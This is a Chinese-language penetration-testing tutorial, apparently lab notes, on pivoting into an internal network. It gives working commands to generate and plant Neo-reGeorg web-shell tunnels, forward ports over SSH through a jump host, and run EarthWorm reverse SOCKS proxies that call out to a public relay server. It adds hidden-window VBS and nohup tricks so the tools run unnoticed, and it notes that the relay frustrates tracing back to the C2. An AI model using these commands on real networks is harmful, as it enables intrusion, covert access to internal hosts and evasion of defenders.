[TOC]



# ==隧道通信==

#### 一、基于Neo-reGeorg

Neo-reGeorg是常见的http正向隧道工具，是reGeorg工具的升级版。增加了很多特性，例如像内容加密、避免被检测、请求头定制、响应码定制、支持py3等等，https://github.com/L-codes/Neo-reGeorg

##### 1、生成木马

```shell
python3 neoreg.py generate -k 123456
```

生成的木马文件如下：

```
[+] Create neoreg server files:       => neoreg_servers/tunnel.aspx       => neoreg_servers/tunnel.jspx       => neoreg_servers/tunnel_compatibility.jspx       => neoreg_servers/tunnel.php       => neoreg_servers/tunnel.ashx       => neoreg_servers/tunnel.jsp       => neoreg_servers/tunnel_compatibility.jsp
```

![image-20241011221429439](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241011221429439.png)

##### 2、植入Windows2016

根据目标主机所提供的服务器类型来决定使用哪种木马。并将页面文件放入目标主机的Web服务器目录下。

![image-20241011221810523](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241011221810523.png)

##### 3、实现连接

```shell
┌──(root㉿kali)-[/home/kali/Neo-reGeorg-master]
└─# python3 neoreg.py -k p-0p-0p-0 -u "http://192.168.1.105/tunnel.php"
```

![image-20241011222357286](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241011222357286.png)

上述输出的意思是Neo-reGeorg开启了一个Socks5的代理服务器，可以直接访问 10.10.10.X 内网，只需要在 Kali 的主机或浏览器中配置代理服务器为 Socks5 类型，并且设置代理服务器为： 127.0.0.1:1080 即可。

> 说实话，这里是将生成的木马，通过页面访问在 winserver 2016 上运行起来，然后再在 kali上运行 reo-regeorg 来连接 winserver 2016 上的木马，此时win server 2016 就会充当中间通道连来接 kali 和 win7

##### 4、在Kali的浏览器中配置代理

![image-20211206042220938](https://gitee.com/ymq_typroa/typroa/raw/main/20211206042221.png)

##### 5、在Kali中访问10网段

比如访问：http://10.10.10.129/dashboard/phpinfo.php 或 [http://10.10.10.128](http://10.10.10.128/) 等。

![image-20211206042320025](https://gitee.com/ymq_typroa/typroa/raw/main/20211206042320.png)

#### 二、基于SSH的隧道通信

SSH 会自动加密和解密所有SSH 客户端与服务端之间的网络数据。但是，SSH 还能够将其他TCP 端口的网络数据通过SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做“隧道”（tunneling），这是因为SSH 为其他TCP 链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP 这些TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境中的防火墙限制了一些网络端口的使用，但是允许SSH 的连接，也能够通过将TCP 端口转发来使用SSH 进行通讯。

##### 1、SSH本地转发

> 本地指的意思就是 ssh 连接木马存在的内网主机，所以对于木马来说就叫 本地

为了演示方便，本实验使用Kali(攻击机) + CentOS(跳板机) + Windows7 (目标主机)进行操作。此时，只需要在Kali上输入以下命令即可通过本地访问到Windows7上的80端口。

```
ssh -CfNg -L 8879:10.10.10.129:80 root@192.168.112.149   
(112.149为CentOS跳板机)运行上述命令，并输入112.149跳板机的root密码，即可本地访问 localhost:8879，实现对 10.10.10.129:80 的访问。
```

##### 2、SSH远程转发

> 所以这里的远程 指的就是 对于木马来说 ssh 连接的 kali 主机相对于木马是远程的

在跳板机 CentOS 或 Windows 2016上运行以下指令：

```
ssh -CfNg -R 3333:10.10.10.129:80 denny@192.168.112.148   
并输入 Kali 的SSH密码
```

在Kali上运行： /etc/init.d/ssh start 启动SSH服务。

Windows 2016默认没有自带OpenSSH，单独下载并配置好环境变量即可运行。

https://github.com/PowerShell/Win32-OpenSSH/releases，下载后根据 https://www.cnblogs.com/wrxiang/p/15145288.html 的步骤完成SSHD服务的安装。

![image-20220425023229788](https://gitee.com/ymq_typroa/typroa/raw/main/20220425023229.png)

上述配置完成后，在Kali上直接访问：[http://localhost:3333](http://localhost:3333/) 即可访问到 10.10.10.129:80

#### 三、EarthWorm的使用

内网穿透神器EarthWorm，(简称EW)是一套轻量便携且功能强大的网络穿透工具，基于标准C开发，具有socks5代理、端口转发、端口映射三大功能。相较于其他穿透工具，如reGeorg等， EarthWorm可以穿透更复杂的内网环境同时也不需要跳板机运行web服务，也可以支持多平台间的转接通讯，如Linux、Windows、MacOS、Arm-Linux等。

下载地址：https://gitee.com/aveng/EarthWorm/tree/master/download 和 https://github.com/mrawb/ew/blob/master/ew_for_linux64，本工具目前已经不再更新，被封杀。

##### 1、正向代理

![image-20241012220730326](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241012220730326.png)

正常情况下，没有代理是无法访问内网10.10.10.128主机的，也无法ping通

![image-20241012213317315](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241012213317315.png)

利用此工具在Windows 2016上运行

```shell
ew_for_win_32.exe -s ssocksd -l 1080
```

![image-20241012213503452](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241012213503452.png)

然后在Kali中指定Windows 2016的1080端口为浏览器代理或全局代理（/etc/proxychains4.conf）。此代理的ip地址就是 win server 2016 的IP地址

![image-20241012213547318](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241012213547318.png)

![image-20241012215546532](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241012215546532.png)

##### 2、反弹代理

![image-20241012221902803](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241012221902803.png)

> 本实验中，公网服务器的 8086 端口时 winserver 2016 与公网服务器的通信端口，而 8080 端口号是，自己作为 kali 的代理服务器时的代理端口

（1）先找一台公网服务器，并运行以下命令：

```shell
./ew_for_linux64 -s rcsocks -l 8080 -e 8086     
# 确保8080和8086均是开放端口
```

> 其中 8080 端口是攻击者服务器开放的，是用来让攻击机连接的，最为攻击机的代理服务器，使得攻击机间接连接内网跳板机。
>
> 8086 端口是用来让内网中的跳板机连接的，使得内网中的跳板机可以和攻击者服务器进行通信。

![image-20241012222848763](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241012222848763.png)

（2）在Windows2016跳板机上，运行以下命令：

```shell
ew_for_win_32.exe -s rssocks -d 47.96.116.171 -e 8086
```

![image-20241012222911198](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241012222911198.png)

（3）在Kali上配置代理服务器为：Socks5，47.96.116.171:8080

![image-20241012222805717](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241012222805717.png)

> 使用反弹代理后，在被攻击者进行溯源时，将只会跟踪到公网主机IP，而不是跟踪到C2服务器IP地址。

![image-20241012222943385](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241012222943385.png)

#### 四、让命令在后台执行

如果在跳板机上执行命令，如果要打开命令行窗口，则非常容易被察觉，无助于在真实场景中使用。

##### 1、start /b +命令

该方法可以在命令行执行时将命令在当前窗口后台执行，并且命令行提示符可以正常键入其他命令，但是如果将命令行窗口关闭，则无法正常运行。如：

```
start /b ew_for_win_32.exe -s ssocksd -l 1080
```

##### 2、使用VBS脚本

该方法利用VBScript脚本来进行后台静默执行，不需要打开命令行窗口，只需要创建一个vbs后缀名的文件双击运行即可。

```
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("C:\ME\earthworm\ew_for_win_32.exe -s ssocksd -l 1080"), 0, True
```

双击该文件即可后台运行，没有任何窗口产生。

##### 3、在Linux中使用nohup &

后台静默执行，即使关闭命令行也不影响。

```
nohup ./ew_for_linux64 -s rcsocks -l 8080 -e 8086 &
```